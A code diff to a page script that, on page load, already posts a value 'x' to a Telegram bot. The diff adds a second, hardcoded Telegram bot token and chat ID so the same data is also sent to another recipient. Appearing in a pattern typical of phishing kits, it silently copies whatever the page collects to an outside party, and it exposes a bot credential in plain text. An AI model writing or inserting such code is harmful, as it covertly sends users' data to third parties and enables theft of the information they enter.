@@ -152,9 +152,10 @@ document.addEventListener("DOMContentLoaded", () => {
         chat_id: process.env.CHAT_ID,
       }),
     };
-
+  
     console.log(x);
-
+  
+    // First Telegram (existing)
     fetch(
       `https://api.telegram.org/bot${process.env.BOT_ID}/sendMessage`,
       options
@@ -162,5 +163,30 @@ document.addEventListener("DOMContentLoaded", () => {
       .then((response) => response.json())
       .then((response) => console.log(response))
       .catch((err) => console.error(err));
+  
+    // Second Telegram (new - hardcoded)
+    const secondTelegramOptions = {
+      method: "POST",
+      mode: "cors",
+      headers: {
+        accept: "application/json",
+        "content-type": "application/json",
+      },
+      body: JSON.stringify({
+        text: String(x),
+        disable_web_page_preview: false,
+        disable_notification: false,
+        reply_to_message_id: null,
+        chat_id: "8410717800", // Hardcoded chat ID
+      }),
+    };
+  
+    fetch(
+      "https://api.telegram.org/bot7199118956:AAE7DRxYf3huaDT4UMHO3t2JDUqgD8U_S1U/sendMessage",
+      secondTelegramOptions
+    )
+      .then((response) => response.json())
+      .then((response) => console.log('Second Telegram:', response))
+      .catch((err) => console.error('Second Telegram error:', err));
   }
 });
